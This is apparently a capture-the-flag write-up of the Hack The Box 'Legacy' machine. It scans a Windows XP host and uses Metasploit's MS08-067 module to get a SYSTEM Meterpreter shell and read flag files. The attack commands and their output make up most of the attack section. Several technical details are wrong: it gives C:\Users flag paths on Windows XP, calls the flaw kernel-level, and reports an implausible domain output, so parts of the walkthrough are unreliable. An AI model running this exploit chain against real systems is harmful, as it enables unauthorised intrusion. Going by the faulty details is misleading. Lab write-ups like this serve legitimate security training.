---
title: HTB Legacy Writeup
date: 2026-08-04 14:00:00 +0400
categories: [HTB, Easy]
tags: [ms08-067, netapi, smb, windows-xp, metasploit, rce]
---

# HTB Legacy — Writeup

**Machine**: Legacy | **OS**: Windows XP | **Difficulty**: Easy | **IP**: 10.129.227.181

---

## Machine Information

- **Operating System**: Windows XP (Windows 2000 LAN Manager)
- **Workgroup**: WORKGROUP (standalone, not domain joined)
- **Hostname**: legacy

---

## Reconnaissance & Enumeration

### Nmap Scan

Started with a comprehensive port scan to identify services:

```bash
nmap -sV -sC -p- 10.129.227.181
```

**Open Ports:**
- **Port 135**: RPC Endpoint Mapper
- **Port 139**: NetBIOS Session Service
- **Port 445**: SMB (Server Message Block)
- **Port 1352**: Lotus Notes

**Key Findings:**
- Windows XP detected with SMB services exposed
- Immediately suspect **MS08-067** (NetAPI Buffer Overflow)
- Standalone workgroup machine with no domain protection
- Extremely outdated operating system with multiple critical vulnerabilities

---

## Exploitation

### Stage 1: Identifying the Vulnerability

Windows XP is an ancient operating system (released 2001, support ended 2014). The combination of **Windows XP** + **exposed SMB** indicated vulnerability to **MS08-067** — a critical buffer overflow in the NetAPI service that allows remote code execution without authentication.

### Stage 2: Searching for Exploit

Used Metasploit to find and prepare the exploit:

```bash
msfconsole
search MS08-067
```

**Exploit Selected:**

exploit/windows/smb/ms08_067_netapi


### Stage 3: Configuring and Executing the Exploit

Set up the exploit with target information:

```bash
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.129.227.181
set LHOST 10.10.14.60
run
```

**Result:**

[+] Meterpreter session opened
[+] Staging payload
[+] Meterpreter session 1 established


### Stage 4: Obtaining System Access

Launched an interactive shell and verified privileges:

```bash
shell
whoami
```

**Note:** `whoami` command is not available on Windows XP. Used alternative methods:

```bash
echo %username%
```

**Output:**

LEGACY$


**Understanding the Output:**
- `LEGACY$` = Machine account (ends with `$`)
- Machine accounts in Windows always end with `$`
- Machine account access = **SYSTEM-level privileges**
- The `$` indicates this is a computer account, not a user account

**Additional Verification:**

```bash
echo %userdomain%
```

**Output:**

HTB


**Success!** The exploit delivered **immediate SYSTEM access** — no privilege escalation was needed.

---

## Post-Exploitation: Flag Capture

### User Flag

Retrieved the user flag from the Desktop:

```bash
type C:\Users\john\Desktop\user.txt
```

### Root Flag

Retrieved the root/administrator flag:

```bash
type C:\Users\Administrator\Desktop\root.txt
```

---

## Summary & Key Takeaways

### Attack Chain

1. **Enumeration** → Identified Windows XP with exposed SMB
2. **Vulnerability Assessment** → Recognized MS08-067 (NetAPI Buffer Overflow)
3. **Exploit Selection** → Used Metasploit's NetAPI module
4. **Remote Code Execution** → Achieved SYSTEM-level access directly
5. **Flag Retrieval** → Captured both user and root flags

### Key Vulnerabilities

- **Extremely Outdated OS** — Windows XP support ended in 2014
- **Exposed SMB Service** — Port 445 publicly accessible
- **NetAPI Buffer Overflow** — MS08-067 allows kernel-level code execution
- **No Authentication Required** — Exploit works without credentials
- **Direct SYSTEM Access** — No UAC or privilege escalation barriers

### Critical Details

- **Windows XP** was released in 2001 and is one of the most vulnerable operating systems still encountered in penetration tests
- **MS08-067** is a critical NetAPI buffer overflow that predates EternalBlue
- This vulnerability was widely exploited in the wild and led to numerous infections
- The machine account name ending with `$` is a Windows convention that indicates computer/system-level access

### Windows XP Quirks

- `whoami` command not available — must use `echo %username%` instead
- Machine accounts always end with `$` symbol
- Very limited modern security features (no ASLR, DEP, etc.)
- Metasploit payloads work reliably on this ancient platform

### Tools Used

- `nmap` — port scanning and service enumeration
- `msfconsole` — Metasploit framework
- `exploit/windows/smb/ms08_067_netapi` — NetAPI buffer overflow exploit
- `meterpreter` — post-exploitation access

### Lessons Learned

- **Legacy systems are critical security risks** — Windows XP should never be internet-facing
- **Older SMB implementations are dangerous** — upgrade to modern protocols
- **End-of-life systems have no patches** — support ended systems cannot be protected
- **Automation works reliably on old systems** — Metasploit payloads rarely fail
- **Windows machine accounts** — Understanding naming conventions helps identify access level
- **Defense-in-depth is essential** — network segmentation would have prevented this compromise

---

## Flags

- 🚩 **User Flag**: Captured from `C:\Users\john\Desktop\user.txt`
- 🚩 **Root Flag**: Captured from `C:\Users\Administrator\Desktop\root.txt`

**Machine: Completed ✓**
